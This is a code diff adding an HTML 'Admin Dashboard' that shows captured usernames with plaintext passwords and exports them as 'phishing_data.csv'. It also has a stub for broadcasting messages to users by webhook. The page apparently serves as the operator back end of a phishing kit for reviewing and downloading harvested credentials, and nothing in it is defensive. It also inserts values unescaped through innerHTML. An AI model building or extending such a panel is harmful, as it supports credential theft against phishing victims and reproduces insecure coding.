@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1>Admin Dashboard</h1>
+    <div class="button-group">
+      <button onclick="broadcastMessage()">Broadcast Message</button>
+      <button onclick="exportData()">Export Data</button>
+    </div>
+
+    <table id="userTable">
+      <thead>
+        <tr>
+          <th>Username</th>
+          <th>Password</th>
+          <th>Timestamp</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- Data will be inserted here -->
+      </tbody>
+    </table>
+  </div>
+
+  <script>
+    const data = [
+      { username: "user1", password: "pass1", timestamp: "2025-09-07T12:00:00Z" },
+      { username: "user2", password: "pass2", timestamp: "2025-09-07T12:01:00Z" }
+    ];
+
+    const tbody = document.querySelector("#userTable tbody");
+    data.forEach(item => {
+      const row = document.createElement("tr");
+      row.innerHTML = `
+        <td>${item.username}</td>
+        <td>${item.password}</td>
+        <td>${item.timestamp}</td>
+      `;
+      tbody.appendChild(row);
+    });
+
+    function broadcastMessage() {
+      const message = prompt("Enter message to broadcast:");
+      if (message) {
+        console.log("Broadcasting:", message);
+        // Send to all users via webhooks
+      }
+    }
+
+    function exportData() {
+      const csv = [
+        "Username,Password,Timestamp",
+        ...data.map(item => `${item.username},${item.password},${item.timestamp}`)
+      ].join("\n");
+      const blob = new Blob([csv], { type: "text/csv" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "phishing_data.csv";
+      a.click();
+    }
+  </script>
+</body>
+</html>
